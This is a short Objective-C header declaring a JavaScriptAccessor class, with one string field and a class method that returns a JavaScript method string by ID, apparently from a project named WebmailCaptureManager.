//
//  JavaScriptAccessor.h
//  WebmailCaptureManager
//
//  Created by Makara Khloth on 11/8/16.
//  Copyright © 2016 ophat. All rights reserved.
//

#import <Foundation/Foundation.h>

@interface JavaScriptAccessor : NSObject {
    NSString *mJavaScriptMethods;
}

+ (NSString *) jsMethod: (int) aMethodID;

@end
